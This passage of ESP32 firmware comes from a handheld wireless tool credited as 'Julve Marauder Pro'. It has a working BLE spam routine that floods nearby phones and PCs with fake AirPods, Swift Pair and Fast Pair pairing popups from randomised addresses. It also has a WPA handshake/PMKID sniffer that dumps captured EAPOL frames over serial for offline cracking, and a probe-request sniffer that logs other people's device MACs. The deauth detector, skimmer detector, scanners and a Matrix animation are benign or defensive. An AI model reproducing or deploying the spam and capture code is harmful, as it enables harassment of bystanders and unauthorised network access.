  uint8_t windows_data[] = { 0x1E, 0xFF, 0x06, 0x00, 0x03, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
  uint8_t android_data[] = { 0x0E, 0x16, 0x2c, 0xfe, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };

  esp_ble_adv_params_t adv_params = {
      .adv_int_min = 0x20, .adv_int_max = 0x30, .adv_type = ADV_TYPE_IND,
      .own_addr_type = BLE_ADDR_TYPE_RANDOM, .channel_map = ADV_CHNL_ALL,
      .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
  };

  uint8_t newMac[6];

  while(!checkExitOrScreen()) {
    if (digitalRead(PIN_UP) == LOW) { spamType = (spamType + 1) % 3; changed = true; delay(200); }
    if (digitalRead(PIN_DOWN) == LOW) { spamType = (spamType - 1 + 3) % 3; changed = true; delay(200); }

    if (changed) {
      tft.fillScreen(TFT_DARKCYAN); tft.setTextColor(TFT_WHITE);
      tft.drawCentreString("BT SPAM (USE UP/DOWN)", 80, 10, 1);
      tft.setTextColor(TFT_YELLOW); tft.drawString("SELECT: Salir/Apagar", 5, 110);
      
      tft.setTextColor(TFT_WHITE);
      if(spamType == 0) tft.drawCentreString(">> APPLE AirPods <<", 80, 50, 1);
      else if(spamType == 1) tft.drawCentreString(">> WINDOWS Swift <<", 80, 50, 1);
      else tft.drawCentreString(">> ANDROID FastPair <<", 80, 50, 1);
      
      if(spamType == 0) esp_ble_gap_config_adv_data_raw(apple_data, 31);
      else if(spamType == 1) esp_ble_gap_config_adv_data_raw(windows_data, 31);
      else esp_ble_gap_config_adv_data_raw(android_data, 31);
      
      changed = false;
    }

    generateRandomMAC(newMac); esp_ble_gap_set_rand_addr(newMac);
    esp_ble_gap_start_advertising(&adv_params);
    delay(100); 
    esp_ble_gap_stop_advertising();
    delay(20); 
  }
  BLEDevice::deinit(true); delay(100);
}

// --- PROBE SNIFFER  ---
void probeSniffer() {
  tft.fillScreen(TFT_BLACK); tft.setTextColor(TFT_CYAN);
  tft.drawCentreString("PROBE SNIFFER", 80, 5, 2);
  tft.setTextColor(TFT_YELLOW); tft.drawString("SELECT: Salir/Apagar", 5, 110);
  last_probe_mac = ""; last_probe_ssid = ""; new_probe = false;
  esp_wifi_set_channel(random(1, 12), WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous(true);
  long last_ch_switch = 0;
  while(!checkExitOrScreen()) {
    if (millis() - last_ch_switch > 1500) { esp_wifi_set_channel(random(1, 12), WIFI_SECOND_CHAN_NONE); last_ch_switch = millis(); }
    if(new_probe && last_probe_mac != "") {
      tft.fillRect(0, 30, 160, 80, TFT_BLACK); 
      tft.setTextColor(TFT_WHITE); tft.drawString("MAC Movil:", 5, 35);
      tft.setTextColor(TFT_RED); tft.drawString(last_probe_mac, 5, 50);
      tft.setTextColor(TFT_WHITE); tft.drawString("Busca red:", 5, 70);
      tft.setTextColor(TFT_GREEN); tft.drawString(last_probe_ssid.substring(0, 22), 5, 85);
      new_probe = false; 
    }
    delay(20);
  }
  esp_wifi_set_promiscuous(false);
}

// --- DEAUTH DETECTOR ---
void deauthDetector() {
  tft.fillScreen(TFT_BLACK); tft.setTextColor(TFT_GREEN);
  tft.drawCentreString("DEAUTH DETECTOR", 80, 5, 2);
  tft.setTextColor(TFT_WHITE); tft.drawString("Escuchando...", 5, 40);
  tft.setTextColor(TFT_YELLOW); tft.drawString("SELECT: Salir/Apagar", 5, 110);

  deauth_packets = 0; deauth_detected = false;
  esp_wifi_set_promiscuous(true);
  long last_ch_switch = 0;

  while(!checkExitOrScreen()) {
    if (millis() - last_ch_switch > 500) { esp_wifi_set_channel(random(1, 12), WIFI_SECOND_CHAN_NONE); last_ch_switch = millis(); }
    if (deauth_detected) {
      tft.fillScreen(TFT_RED); tft.setTextColor(TFT_WHITE);
      tft.drawCentreString("! ATAQUE DETECTADO !", 80, 30, 2);
      String found_ssid = "";
      for(int i = 0; i < global_network_count; i++) {
        if (memcmp(global_networks[i].bssid, last_deauth_bssid_ap, 6) == 0 || memcmp(global_networks[i].bssid, last_deauth_bssid_sta, 6) == 0) {
          found_ssid = global_networks[i].ssid; break;
        }
      }
      if (found_ssid != "") {
        tft.setTextColor(TFT_WHITE); tft.drawCentreString("Red Atacada:", 80, 60, 1);
        tft.setTextColor(TFT_YELLOW); tft.drawCentreString(found_ssid.substring(0, 20), 80, 80, 2);
      } else {
        tft.setTextColor(TFT_WHITE); tft.drawCentreString("BSSID Atacado:", 80, 60, 1);
        tft.setTextColor(TFT_YELLOW); tft.drawCentreString(macToString(last_deauth_bssid_ap), 80, 80, 1);
      }
      delay(2000); 
      tft.fillScreen(TFT_BLACK); deauth_packets = 0; deauth_detected = false;
      tft.setTextColor(TFT_GREEN); tft.drawCentreString("DEAUTH DETECTOR", 80, 5, 2);
      tft.setTextColor(TFT_WHITE); tft.drawString("Escuchando...", 5, 40);
      tft.setTextColor(TFT_YELLOW); tft.drawString("SELECT: Salir/Apagar", 5, 110);
    }
    delay(50);
  }
  esp_wifi_set_promiscuous(false);
}

// --- BLE SCANNER ---
void bleScanner() {
  tft.fillScreen(TFT_BLUE); tft.setTextColor(TFT_WHITE);
  tft.drawCentreString("BLE SCANNER", 80, 5, 2);
  tft.setTextColor(TFT_YELLOW); tft.drawString("SELECT: Salir/Apagar", 5, 110);

  BLEDevice::init("");
  BLEScan* pBLEScan = BLEDevice::getScan();
  pBLEScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks());
  pBLEScan->setActiveScan(true); pBLEScan->setInterval(100); pBLEScan->setWindow(99);

  while(!checkExitOrScreen()) {
    pBLEScan->start(1, false); pBLEScan->clearResults();   
    if(last_ble_mac != "") {
      tft.fillRect(0, 30, 160, 80, TFT_BLUE); 
      tft.setTextColor(TFT_CYAN); tft.drawString(last_ble_mac, 5, 35);
      tft.setTextColor(TFT_WHITE); tft.drawString("N: " + last_ble_name.substring(0,20), 5, 55);
      tft.setTextColor(TFT_GREEN); tft.drawString("S: " + String(last_ble_rssi) + " dBm", 5, 75);
    }
  }
  BLEDevice::deinit(true);
}

// --- WIFI CHANNEL ANALYZER ---
void wifiChannelAnalyzer() {
  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_WHITE); tft.drawCentreString("WIFI ANALYZER", 80, 2, 1);
  tft.setTextColor(TFT_YELLOW); tft.drawString("SELECT: Salir/Apagar", 5, 115);

  analyzer_mode = true;
  esp_wifi_set_promiscuous(true);

  long last_update = 0;
  int current_ch = 1;
  int max_pkts = 1; 

  while(!checkExitOrScreen()) {
      esp_wifi_set_channel(current_ch, WIFI_SECOND_CHAN_NONE);
      delay(40);
      current_ch++;
      if(current_ch > 13) current_ch = 1;

      if(millis() - last_update > 500) {
          max_pkts = 1;
          for(int i=1; i<=13; i++) {
              if(channel_packets[i] > max_pkts) max_pkts = channel_packets[i];
          }

          for(int i=1; i<=13; i++) {
              int barHeight = (channel_packets[i] * 80) / max_pkts;
              int x = 2 + (i-1)*12;
              int y = 100 - barHeight;
              
              tft.fillRect(x, 20, 10, 80, TFT_BLACK); 
              tft.fillRect(x, y, 10, barHeight, TFT_GREEN);
              tft.setTextColor(TFT_WHITE);
              tft.drawNumber(i, x, 103, 1);
              
              channel_packets[i] = 0; 
          }
          last_update = millis();
      }
  }
  analyzer_mode = false;
  esp_wifi_set_promiscuous(false);
}

// --- HANDSHAKE / PMKID SNIFFER ---
void handshakeSniffer() {
  tft.fillScreen(TFT_BLACK); tft.setTextColor(TFT_CYAN);
  tft.drawCentreString("HANDSHAKE SNIFFER", 80, 5, 2);
  tft.setTextColor(TFT_WHITE); tft.drawString("Escuchando EAPOL...", 5, 40);
  tft.setTextColor(TFT_YELLOW); tft.drawString("SELECT: Salir/Apagar", 5, 115);

  handshake_mode = true;
  handshake_caught = false;
  esp_wifi_set_promiscuous(true);
  long last_ch_switch = 0;

  while(!checkExitOrScreen()) {
      if (millis() - last_ch_switch > 300) {
          esp_wifi_set_channel(random(1, 14), WIFI_SECOND_CHAN_NONE);
          last_ch_switch = millis();
      }

      if(handshake_caught) {
          tft.fillScreen(TFT_GREEN); tft.setTextColor(TFT_BLACK);
          tft.drawCentreString("! HANDSHAKE !", 80, 20, 2);
          tft.drawCentreString("CAPTURADO", 80, 40, 2);
          tft.drawString("BSSID:", 10, 70);
          tft.drawString(macToString(handshake_bssid), 10, 85);
          tft.drawString("Revisa el USB Serial", 5, 110);
          
          Serial.println("\n========== HANDSHAKE CAPTURADO ==========");
	  Serial.print("BSSID: ");
	  Serial.println(macToString(handshake_bssid));
	  Serial.println("Frame hexadecimal:");
	  for(int i = 0; i < handshake_len; i++) {
	     if(handshake_frame[i] < 0x10) Serial.print("0");
	     Serial.print(handshake_frame[i], HEX);
	     Serial.print(" ");
	     if((i + 1) % 16 == 0) Serial.println();
	  }
	  Serial.println("\n==========================================");

          delay(4000);
          handshake_caught = false;

          tft.fillScreen(TFT_BLACK); tft.setTextColor(TFT_CYAN);
          tft.drawCentreString("HANDSHAKE SNIFFER", 80, 5, 2);
          tft.setTextColor(TFT_WHITE); tft.drawString("Escuchando EAPOL...", 5, 40);
          tft.setTextColor(TFT_YELLOW); tft.drawString("SELECT: Salir/Apagar", 5, 115);
      }
      delay(50);
  }
  handshake_mode = false;
  esp_wifi_set_promiscuous(false);
}

// --- BLE SKIMMER DETECTOR ---
void bleSkimmerDetect() {
  tft.fillScreen(TFT_MAROON); tft.setTextColor(TFT_WHITE);
  tft.drawCentreString("SKIMMER DETECTOR", 80, 5, 2);
  tft.setTextColor(TFT_WHITE); tft.drawString("Patrullando BLE...", 5, 40);
  tft.setTextColor(TFT_YELLOW); tft.drawString("SELECT: Salir/Apagar", 5, 115);

  skimmer_mode = true;
  skimmer_mac = "";

  BLEDevice::init("");
  BLEScan* pBLEScan = BLEDevice::getScan();
  pBLEScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks());
  pBLEScan->setActiveScan(true); pBLEScan->setInterval(100); pBLEScan->setWindow(99);

  while(!checkExitOrScreen()) {
      pBLEScan->start(1, false); pBLEScan->clearResults();
      
      if(skimmer_mac != "") {
          tft.fillScreen(TFT_RED); tft.setTextColor(TFT_WHITE);
          tft.drawCentreString("! PELIGRO !", 80, 15, 2);
          tft.setTextColor(TFT_YELLOW); tft.drawCentreString(skimmer_type, 80, 45, 1);
          tft.setTextColor(TFT_WHITE);
          tft.drawString(skimmer_mac, 10, 70);
          tft.drawString("RSSI: " + String(skimmer_rssi) + " dBm", 10, 85);
          
          delay(4000);
          skimmer_mac = "";
          
          tft.fillScreen(TFT_MAROON); tft.setTextColor(TFT_WHITE);
          tft.drawCentreString("SKIMMER DETECTOR", 80, 5, 2);
          tft.setTextColor(TFT_WHITE); tft.drawString("Patrullando BLE...", 5, 40);
          tft.setTextColor(TFT_YELLOW); tft.drawString("SELECT: Salir/Apagar", 5, 115);
      }
  }
  BLEDevice::deinit(true);
  skimmer_mode = false;
}

// ---  MATRIX MODE (ROTADO Y CON COLA VERTICAL) ---
void matrixMode() {
  tft.setRotation(3); 
  tft.fillScreen(TFT_BLACK);
  
  int fontWidth = 6;
  int fontHeight = 8;
  int cols = 160 / fontWidth;
  
  int drops[27]; 
  int tail[27];
  
  for(int i=0; i<cols; i++) {
     drops[i] = random(-128, 0); 
     tail[i] = random(4, 15);    
  }
  
  while(!checkExitOrScreen()) {
    for(int i=0; i<cols; i++) {
       tft.fillRect(i * fontWidth, drops[i] - (tail[i] * fontHeight), fontWidth, fontHeight, TFT_BLACK);

       tft.setTextColor(tft.color565(0, 100, 0), TFT_BLACK);
       tft.drawChar((char)(random(33, 126)), i * fontWidth, drops[i] - fontHeight, 1);

       tft.setTextColor(TFT_GREEN, TFT_BLACK);
       tft.drawChar((char)(random(33, 126)), i * fontWidth, drops[i], 1);

       drops[i] += fontHeight;

       if(drops[i] - (tail[i] * fontHeight) > 128) {
           drops[i] = random(-50, 0);
           tail[i] = random(4, 15);
       }
    }
    delay(30); 
  }
  
  tft.setRotation(1);
  tft.fillScreen(TFT_BLACK);
}

// --- CREDITOS ---
void showCredits() {
  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_GREEN);
  tft.drawCentreString("JULVE MARAUDER PRO", 80, 5, 2);
  tft.setTextColor(TFT_CYAN);
  tft.drawString("Github:", 5, 35);
  tft.setTextColor(TFT_WHITE);
  tft.drawString("github.com/DonJulve", 5, 45);
  tft.setTextColor(TFT_CYAN);
  tft.drawString("LinkedIn:", 5, 65);
  tft.setTextColor(TFT_WHITE);
  tft.drawString("linkedin.com/in/", 5, 75);
  tft.drawString("javier-julve-yubero", 5, 85);
  tft.setTextColor(TFT_YELLOW);
  tft.drawString("SELECT: Salir/Apagar", 5, 110);
  while(!checkExitOrScreen()) { delay(10); }
}
